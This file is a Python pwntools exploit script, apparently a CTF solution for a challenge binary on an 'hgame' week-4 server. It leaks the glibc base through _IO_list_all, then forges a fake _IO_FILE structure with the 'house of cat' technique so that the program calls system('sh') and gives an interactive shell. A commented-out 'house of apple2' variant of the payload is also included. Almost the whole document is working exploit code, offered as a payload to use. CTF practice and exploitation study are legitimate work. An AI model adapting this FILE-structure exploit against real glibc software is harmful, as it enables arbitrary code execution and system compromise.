# -*- coding: UTF-8 -*-
from pwn import *
import sys
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
python_version = sys.version_info.major
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')

debug = False if "r" in sys.argv else True

vuln_name = "./vuln"
libc_path = "./libc.so.6"
libc_source_path = "/home/yrl/glibc-all-in-one/libs-src/glibc-2.36"
libc_symbol_path = "./78228edf61bed248e503b8107a29c1e67ceeee.debug"

elf, rop = ELF(vuln_name), ROP(vuln_name)
libc, roplibc = ELF(libc_path), ROP(libc_path)
os.system("chmod +x " + vuln_name)

if debug:
    io = process([vuln_name],env={'LD_PRELOAD':libc_path})
else:
    io = remote("week-4.hgame.lwsec.cn", 31831)

def debug(io, gdb_script):
    if debug == True:
        gdb.attach(io) if gdb_script == None else gdb.attach(io,gdb_script.format(libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))
        pause()

def get_libc_gadget(rop_gadget):
    if python_version == 2:
        gadget = libc.search(rop_gadget).next() if rop_gadget == '/bin/sh\x00' else libc.search(asm(rop_gadget)).next()
    else:
        gadget = libc.search(rop_gadget.encode()).__next__() if rop_gadget == '/bin/sh\x00' else libc.search(asm(rop_gadget)).__next__()
    return gadget

    
gdb_script='''
source /home/yrl/loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''
l64 = lambda      :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
l32 = lambda      :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a.encode(),b) if python_version == 3 and type(a) == str else io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x.encode()) if python_version == 3 and type(x) == str else io.sendline(x)
sa = lambda a,b		: io.sendafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : debug(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))

ru('looks like this: ')
IO_list_all = int(ru("\n")[-14:],16)
lg('IO_list_all')
libc.address = IO_list_all - libc.symbols['_IO_list_all']
lg('libc.address')
IO_wfile_jumps = libc.address + 0x1f30a0
lg('IO_wfile_jumps')
system = libc.symbols['system']
lg('system')
binsh = get_libc_gadget('/bin/sh\x00')
lg('binsh')
#dbg()
sla('How many things do you think is appropriate to put into the gift?\n','200000') # 0x34000
heapbase = libc.address - 0x34000

# house of cat
fake_io_addr=heapbase+0x10 # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE = 'sh;\x00'.ljust(8,'\x00')         #_flags=rdi
fake_IO_FILE += p64(0)*3
fake_IO_FILE += p64(0) + p64(1) #  writebase < writeptr 
fake_IO_FILE += p64(0)*4
fake_IO_FILE += p64(0)#_IO_backup_base=rdx
fake_IO_FILE += p64(system)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE +=p64(fake_io_addr+0x8)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(0) #mode<=0
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x30)  # vtable=IO_wfile_jumps+0x30
fake_IO_FILE +=p64(0)
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

'''
#house of apple2
fake_io_addr=heapbase+0x10 # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE = '  sh;'.ljust(8,'\x00')         #_flags=rdi
fake_IO_FILE += p64(0)*3
fake_IO_FILE += p64(0) + p64(1) #  writebase < writeptr 
fake_IO_FILE += p64(0)*4
fake_IO_FILE += p64(0)#_IO_backup_base=rdx
fake_IO_FILE += p64(0)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x8)#_wide_data,rax1_addr
fake_IO_FILE += p64(system) #_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(0) #mode<=0
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps)  # vtable=IO_wfile_jumps
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
'''
pay = fake_IO_FILE 
sla('What do you think is appropriate to put into the gitf?\n',pay)
	
irt()




